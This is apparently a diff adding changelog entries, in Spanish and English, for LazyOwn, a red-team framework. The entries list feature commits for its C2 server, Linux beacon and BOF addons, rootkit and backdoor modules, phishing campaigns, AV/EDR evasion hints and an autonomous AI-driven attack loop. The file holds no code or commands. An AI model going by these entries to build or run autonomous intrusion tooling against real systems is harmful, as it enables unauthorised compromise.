+  *   * feat(feat): pipeline \n\n Version: release/0.2.127 \n\n Cómo usarlo: \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 17 may 2026 00:33:29 -04 \n\n Hora: 1778992409
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(security bug fixing in lazybrp): with love \n\n Version: release/0.2.126 \n\n :D \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 16 may 2026 21:39:23 -04 \n\n Hora: 1778981963
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): security issues fixed \n\n Version: release/0.2.125 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 16 may 2026 21:31:11 -04 \n\n Hora: 1778981471
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): security fixes \n\n Version: release/0.2.124 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 16 may 2026 21:08:23 -04 \n\n Hora: 1778980103
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): bug fixing \n\n Version: release/0.2.123 \n\n repair security issueswith love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 16 may 2026 20:39:11 -04 \n\n Hora: 1778978351
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new features and security updates \n\n Version: release/0.2.122 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 16 may 2026 20:14:39 -04 \n\n Hora: 1778976879
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): update CLAUDE.md with session learnings \n\n Version: release/0.2.120 \n\n expand repo map with 30 dirs and gitignore notes; add README convention as coding standard rule 11; add blueprint template_folder pattern to extending section; add new directory row to extension table; add 15f DEPLOY.sh section; update 16 read-these-next \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 15 may 2026 19:22:28 -04 \n\n Hora: 1778887348
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): add README to every project directory \n\n Version: release/0.2.119 \n\n create 21 new READMEs and update 3 existing ones; covers cli, core, modules, templates, sessions, tools, parquets, tests, static, lazyscripts, playbooks, lazyadversaries, scripts, lazyown-docker, lazygui, vpn, docs, lazyc2, modules_ext, modules/backdoor, modules/integrations, modules/rootkit, modules/win_rootkit, cli/commands; remove emojis from lazyaddons and plugins READMEs; update skills README with 95 tool count and collab note \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 15 may 2026 19:02:47 -04 \n\n Hora: 1778886167
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): CLAUDE.md update with beacon family, collab, and onboarding \n\n Version: release/0.2.118 \n\n add sections 15c-15e covering blacksandbeacon Linux BOF, collab_bp team server, and QUICKSTART onboarding; update repository map, C2 surface, sessions table, and cheatsheet \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 15 may 2026 16:11:13 -04 \n\n Hora: 1778875873
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): gap2 team server UI and gap3 onboarding quickstart \n\n Version: release/0.2.118 \n\n add collab.html team dashboard, collab_join CLI cmd, QUICKSTART.md and 67 tests \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 15 may 2026 16:07:58 -04 \n\n Hora: 1778875678
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): blacksandbeacon Linux BOF addon \n\n Version: release/0.2.117 \n\n add blacksandbeacon and blacksandbeacon_bof lazyaddons with 59 tests and README updates \n\n Modified file(s):\n- README.md - lazyaddons/blacksandbeacon.yaml - lazyaddons/blacksandbeacon_bof.yaml - tests/test_blacksandbeacon_addon.py\nCreated file(s):\n- lazyaddons/blacksandbeacon.yaml - lazyaddons/blacksandbeacon_bof.yaml - tests/test_blacksandbeacon_addon.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 15 may 2026 14:02:09 -04 \n\n Hora: 1778868129
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(c2): add blacksandbeacon lazyaddon with Linux BOF support
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some wizzards and some suggester \n\n Version: release/0.2.116 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 14 may 2026 21:48:55 -04 \n\n Hora: 1778809735
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): recomended commands and some love \n\n Version: release/0.2.115 \n\n  \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 14 may 2026 01:26:16 -04 \n\n Hora: 1778736376
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some playbooks \n\n Version: release/0.2.114 \n\n mitre attck \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 13 may 2026 03:54:29 -04 \n\n Hora: 1778658869
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new feature sandbox dockerized run and some other love \n\n Version: release/0.2.113 \n\n with much more love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 13 may 2026 00:06:17 -04 \n\n Hora: 1778645177
+
+
+### Otros
+
+### Otros
+
+  *   * feature(features news): with love \n\n Version: release/0.2.112 \n\n  \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 12 may 2026 23:42:03 -04 \n\n Hora: 1778643723
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new wizard and some refactor in LazyAddons \n\n Version: release/0.2.111 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 12 may 2026 10:26:27 -04 \n\n Hora: 1778595987
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some improvements in autonomous loop \n\n Version: release/0.2.110 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: lun 11 may 2026 01:45:03 -04 \n\n Hora: 1778478303
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): dashboards \n\n Version: release/0.2.109 \n\n new dashboard \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: lun 11 may 2026 00:44:42 -04 \n\n Hora: 1778474682
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(alto refactor con nuevo configurador, eliminacion de bugfixing de linter, nuevo prompt configurable): co namor para la comunidad \n\n Version: release/0.2.107 \n\n jajajja re loco va a quedar esto \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: lun 11 may 2026 00:14:40 -04 \n\n Hora: 1778472880
+
+
+### Otros
+
+### Otros
+
+  *   * feature(fuzzy tab): with love \n\n Version: release/0.2.107 \n\n  \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 10 may 2026 21:41:31 -04 \n\n Hora: 1778463691
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): some love \n\n Version: release/0.2.105 \n\n in refactors varios \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 10 may 2026 16:46:01 -04 \n\n Hora: 1778445961
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): refactor to mcp \n\n Version: release/0.2.104 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 09 may 2026 23:12:52 -04 \n\n Hora: 1778382772
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some patchs \n\n Version: release/0.2.104 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 09 may 2026 18:46:20 -04 \n\n Hora: 1778366780
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): reasdme updates \n\n Version: release/0.2.101 \n\n  \n\n Modified file(s):\n- CHANGELOG.md - README.md - cli/palette_command.py - cli/palette_graph.py - docs/CHANGELOG.html - docs/README.html - lazyaddons/dirtyfrag.yaml - lazyc2.py - skills/lazyown_mcp.py - templates/base.html - templates/palette.html - tests/test_command_palette.py - version.json\nCreated file(s):\n- cli/palette_graph.py - lazyaddons/dirtyfrag.yaml - templates/palette.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 09 may 2026 01:59:51 -04 \n\n Hora: 1778306391
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): readme updates \n\n Version: release/0.2.102 \n\n  \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 09 may 2026 01:58:03 -04 \n\n Hora: 1778306283
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new features, and readme update \n\n Version: release/0.2.101 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 09 may 2026 01:57:18 -04 \n\n Hora: 1778306238
+
+
+### Otros
+
+### Otros
+
+  *   * Add files via upload
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some love to autocomplete commands. \n\n Version: release/0.2.100 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 07 may 2026 23:59:11 -04 \n\n Hora: 1778212751
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feature): assign command with tabs \n\n Version: release/0.2.99 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 07 may 2026 00:53:57 -04 \n\n Hora: 1778129637
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): some bug fixing and refactors \n\n Version: release/0.2.97 \n\n with love \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 06 may 2026 10:56:21 -04 \n\n Hora: 1778079381
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new features llm new bug fixing and new refactoring \n\n Version: release/0.2.97 \n\n with love \n\n Modified file(s):\n- .codacyrc - .env.example - .eslintignore - .eslintrc.json - .gitignore - .mcp.json - .pylintrc - CLAUDE.md - DEPLOY.sh - README.md - cert.pem - cert.pem.bkp - docs/SECURITY_PLAN.md - graphify-out/.graphify_detect.json - graphify-out/.graphify_python - install.sh - key.pem - key.pem.bkp - knowledge_base_vuln.json - lazyaddons/copyfail.yaml - lazyaddons/gui2.yaml - lazyaddons/lazyaddon_creator.yaml - lazyaddons/lazyllmchat.yaml - lazyaddons/opencode_adapter.yaml - lazyaddons/toposwarm.yaml - lazyc2.py - lazyc2/__init__.py - lazyc2/security/__init__.py - lazyc2/security/constants.py - lazyc2/security/services.py - lazyc2/security/validators.py - lazygui/__init__.py - lazygui/__main__.py - lazygui/app.py - lazygui/config/__init__.py - lazygui/config/constants.py - lazygui/config/paths.py - lazygui/config/settings.py - lazygui/panels/__init__.py - lazygui/panels/base.py - lazygui/panels/event_log_panel.py - lazygui/panels/listeners_panel.py - lazygui/panels/registry.py - lazygui/panels/sessions_panel.py - lazygui/panels/terminal_panel.py - lazygui/services/__init__.py - lazygui/services/backend.py - lazygui/services/event_log.py - lazygui/services/factory.py - lazygui/services/local_backend.py - lazygui/services/models.py - lazygui/services/teamserver_backend.py - lazygui/theme/__init__.py - lazygui/theme/manager.py - lazygui/theme/palettes/__init__.py - lazygui/theme/palettes/catppuccin_mocha.py - lazygui/theme/palettes/cobalt_clone.py - lazygui/theme/palettes/gruvbox_dark.py - lazygui/theme/palettes/solarized_light.py - lazygui/theme/palettes/tactical_green.py - lazygui/theme/palettes/tokyo_night.py - lazygui/theme/qss_builder.py - lazygui/theme/tokens.py - lazygui/version.py - lazygui/widgets/__init__.py - lazygui/widgets/command_palette_list.py - lazygui/widgets/event_log_view.py - lazygui/widgets/filter_bar.py - lazygui/widgets/status_badge.py - lazygui/widgets/terminal_view.py - lazygui/windows/__init__.py - lazygui/windows/command_palette_window.py - lazygui/windows/connect_dialog.py - lazygui/windows/main_window.py - modules/ai_fallback.py - modules/hive_invoke.py - modules/knowledge_base_vuln.json - modules/lazyaddon_creator.py - modules/lazyllmchat.py - modules/moe_router.py - modules/obs_parser.py - modules/session_rag.py - modules/toposwarm_bridge.py - modules/world_model.py - payload.json - sessions/implant/implant_crypt.go - skills/hive_mind.py - skills/lazyown_claudemd.py - skills/lazyown_context.py - skills/lazyown_daemon.py - skills/lazyown_hooks.py - skills/lazyown_mcp.py - skills/lazyown_permissions.py - skills/lazyown_session.py - skills/tests/test_harness_e2e.py - skills/toposwarm_autonomous.py - static/security_dashboard.png - templates/index.html - tests/integration_autonomous_flow.py - tests/test_security_lazyc2.py\nDeleted file(s):\n- cert.pem - cert.pem.bkp - key.pem - key.pem.bkp\nCreated file(s):\n- .codacyrc - .env.example - .eslintignore - .eslintrc.json - .mcp.json - .pylintrc - CLAUDE.md - docs/SECURITY_PLAN.md - graphify-out/.graphify_detect.json - graphify-out/.graphify_python - lazyaddons/copyfail.yaml - lazyaddons/gui2.yaml - lazyaddons/lazyaddon_creator.yaml - lazyaddons/lazyllmchat.yaml - lazyaddons/opencode_adapter.yaml - lazyaddons/toposwarm.yaml - lazyc2/__init__.py - lazyc2/security/__init__.py - lazyc2/security/constants.py - lazyc2/security/services.py - lazyc2/security/validators.py - lazygui/__init__.py - lazygui/__main__.py - lazygui/app.py - lazygui/config/__init__.py - lazygui/config/constants.py - lazygui/config/paths.py - lazygui/config/settings.py - lazygui/panels/__init__.py - lazygui/panels/base.py - lazygui/panels/event_log_panel.py - lazygui/panels/listeners_panel.py - lazygui/panels/registry.py - lazygui/panels/sessions_panel.py - lazygui/panels/terminal_panel.py - lazygui/services/__init__.py - lazygui/services/backend.py - lazygui/services/event_log.py - lazygui/services/factory.py - lazygui/services/local_backend.py - lazygui/services/models.py - lazygui/services/teamserver_backend.py - lazygui/theme/__init__.py - lazygui/theme/manager.py - lazygui/theme/palettes/__init__.py - lazygui/theme/palettes/catppuccin_mocha.py - lazygui/theme/palettes/cobalt_clone.py - lazygui/theme/palettes/gruvbox_dark.py - lazygui/theme/palettes/solarized_light.py - lazygui/theme/palettes/tactical_green.py - lazygui/theme/palettes/tokyo_night.py - lazygui/theme/qss_builder.py - lazygui/theme/tokens.py - lazygui/version.py - lazygui/widgets/__init__.py - lazygui/widgets/command_palette_list.py - lazygui/widgets/event_log_view.py - lazygui/widgets/filter_bar.py - lazygui/widgets/status_badge.py - lazygui/widgets/terminal_view.py - lazygui/windows/__init__.py - lazygui/windows/command_palette_window.py - lazygui/windows/connect_dialog.py - lazygui/windows/main_window.py - modules/lazyaddon_creator.py - modules/lazyllmchat.py - modules/toposwarm_bridge.py - skills/lazyown_claudemd.py - skills/lazyown_context.py - skills/lazyown_hooks.py - skills/lazyown_permissions.py - skills/lazyown_session.py - skills/tests/test_harness_e2e.py - skills/toposwarm_autonomous.py - tests/integration_autonomous_flow.py - tests/test_security_lazyc2.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 06 may 2026 10:53:02 -04 \n\n Hora: 1778079182
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(deploy): corrige DEPLOY.sh para GPG opcional, gh releases y orden de variables
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #139 from grisuno/feature/lazyc2-security-plan
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(security): add lazyc2 security layer with validators, services, and pytest tests
+
+
+### Otros
+
+### Otros
+
+  *   * new CLAUDE md FILE
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #138 from grisuno/feature/lazyllmchat-assistant
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(lazyllmchat): add interactive LLM chatbot module and addon
+
+
+### Otros
+
+### Otros
+
+  *   * new features
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(webcli): wire local-shell xterm to /pty namespace with websocket transport
+
+
+### Otros
+
+### Otros
+
+  *   * feat: Claude Code-style harness layer for LazyOwn MCP
+
+
+### Otros
+
+### Otros
+
+  *   * Add files via upload
+
+
+### Otros
+
+### Otros
+
+  *   * Update install.sh for package installations and fixes
+
+
+### Otros
+
+### Otros
+
+  *   * Add files via upload
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #137 from grisuno/feat/toposwarm-addon
+
+
+### Otros
+
+### Otros
+
+  *   * feat: online feedback loop for TopoSwarm routing (RL from user signal)
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #136 from grisuno/feat/toposwarm-addon
+
+
+### Otros
+
+### Otros
+
+  *   * feat: toposwarm lazyaddon — autonomous red team agent driven by TopoSwarm
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #135 from grisuno/feat/toposwarm-addon
+
+
+### Otros
+
+### Otros
+
+  *   * feat: TopoSwarm local brain — fallback when Claude Code / cloud APIs unavailable
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #134 from grisuno/feat/toposwarm-addon
+
+
+### Otros
+
+### Otros
+
+  *   * Add files via upload
+
+
+### Otros
+
+### Otros
+
+  *   * feat: add TopoSwarm AI router addon for LazyOwn MCP
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #133 from grisuno/feature/expand-cloud-rag-stealth-2106303999655273923
+
+
+### Otros
+
+### Otros
+
+  *   * Expand capabilities (Cloud/K8s/RAG) and fix CI
+
+
+### Otros
+
+### Otros
+
+  *   * Expand LazyOwn capabilities and fix CI
+
+
+### Otros
+
+### Otros
+
+  *   * Final submission: Expand LazyOwn capabilities for Cloud/K8s and Multi-Index RAG
+
+
+### Otros
+
+### Otros
+
+  *   * Expand LazyOwn capabilities with Cloud/K8s support and Multi-Index RAG
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat):  \n\n Version: release/0.2.96 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - modules/reactive_engine.py - payload.json - skills/lazyown_mcp.py - skills/lazyown_policy.py - skills/mcp_restart.sh - static/security_dashboard.png\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Mar 30 23:34:47 2026 -0300 \n\n Hora: 1774924487
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(mcp): SSE daemon transport + reliable restart script
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(loop): detect ABABAB oscillation + rebalance policy transitions
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(reactive): ACL errors no longer trigger evasion advisor; stuck-loop blocks by base name
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(autonomy): stuck-loop recovery covers any repeated command, not just 'list'
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(autonomy): self-healing autonomous loop — credential/domain auto-injection, nmap XML parse, stuck-loop recovery
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(mcp): world-class MCP expansion — 92 tools, 26 data sources, zero-gap operator autonomy
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): a new way to search vulns in the context of mcp \n\n Version: release/0.2.95 \n\n and some of love in the autonomous loop \n\n Modified file(s):\n- README.md - docs/README.html - skills/lazyown.md - skills/lazyown_mcp.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 24 02:24:54 2026 -0300 \n\n Hora: 1774329894
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): ReactiveSelector  → pattern-matched decisions (AV/EDR, privesc hints, creds) \n\n Version: release/0.2.94 \n\n ParquetSelector   → past successful commands from session history \n\n Modified file(s):\n- README.md - docs/README.html - skills/README.md - skills/autonomous_daemon.py - skills/lazyown_mcp.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Mar 23 14:51:05 2026 -0300 \n\n Hora: 1774288265
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): hive command now from cli now \n\n Version: release/0.2.93 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html - modules/world_model.py - skills/hive_mind.py - skills/lazyown_campaign.py - skills/lazyown_policy.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Mar 23 02:43:29 2026 -0300 \n\n Hora: 1774244609
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some improves in the cicle \n\n Version: release/0.2.92 \n\n autonomous \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - lazyc2.py - lazyown.py - skills/README.md - skills/autonomous_daemon.py - skills/lazyown.md\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Mar 22 14:55:19 2026 -0300 \n\n Hora: 1774202119
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): autonomous lop is closed now \n\n Version: release/0.2.91 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - payload.json - skills/autonomous_daemon.py - skills/hive_mind.py - skills/lazyown.md - skills/lazyown_mcp.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Mar 22 02:49:40 2026 -0300 \n\n Hora: 1774158580
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some ideas from openclaw \n\n Version: release/0.2.89 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Mar 21 04:54:43 2026 -0300 \n\n Hora: 1774079683
+
+
+### Otros
+
+### Otros
+
+  *   * Add Codacy security scan workflow
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.2.86 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Mar 21 01:45:48 2026 -0300 \n\n Hora: 1774068348
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some love \n\n Version: release/0.2.84 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 17:40:43 2026 -0300 \n\n Hora: 1773952843
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat):  \n\n Version: release/0.2.84 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 16:36:16 2026 -0300 \n\n Hora: 1773948976
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.2.83 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 16:35:31 2026 -0300 \n\n Hora: 1773948931
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): testing deployment and up the versioning semantic \n\n Version: release/0.2.80 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 16:34:29 2026 -0300 \n\n Hora: 1773948869
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): testing deplyment \n\n Version: release/0.2.80 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 16:33:22 2026 -0300 \n\n Hora: 1773948802
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): some improves and refactors in the lazyown env \n\n Version: release/0.2.81 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html - lazyc2.py - pwntomate.py - sessions/phishing/campaigns/short_urls.json - skills/sessions_watcher.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 14:39:49 2026 -0300 \n\n Hora: 1773941989
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some refactors \n\n Version: release/0.2.82 \n\n  \n\n Modified file(s):\n- .gitignore - README.md - docs/README.html - payload.json - skills/lazyown.md - skills/lazyown_mcp.py - static/security_dashboard.png\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 02:34:16 2026 -0300 \n\n Hora: 1773898456
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): mcp \n\n Version: release/0.2.82 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 02:30:33 2026 -0300 \n\n Hora: 1773898233
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): mcp \n\n Version: release/0.2.82 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - parquets/session_knowledge.parquet\nDeleted file(s):\n- parquets/session_knowledge.parquet\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 01:13:21 2026 -0300 \n\n Hora: 1773893601
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): algunos retoques \n\n Version: release/0.2.81 \n\n con amor \n\n Modified file(s):\n- README.md - docs/README.html - skills/lazyown_mcp.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Mar 19 00:51:51 2026 -0300 \n\n Hora: 1773892311
+
+
+### Nuevas características
+
+### Otros
+
